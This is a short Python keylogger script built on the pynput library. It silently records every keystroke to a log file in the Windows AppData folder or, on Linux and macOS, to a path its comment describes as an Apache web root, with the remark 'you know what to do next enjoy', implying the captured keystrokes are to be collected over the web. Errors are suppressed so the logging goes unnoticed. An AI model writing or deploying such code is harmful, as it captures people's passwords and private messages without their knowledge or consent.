from pynput import keyboard
import os
import platform

import platform
if platform.system() == "Windows":
    strokes = os.path.expanduser("~") + "\\AppData\\Roaming\\log.txt"
else:  # For Linux or macOS
    strokes = os.path.expanduser("~") + "/var/www/html/log.txt" # Path to apache2 server (you know what to do next enjoy)

def on_press(key):
    try:
        with open(strokes, "a") as file:
            file.write(str(key) + "\n")
    except Exception as e:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
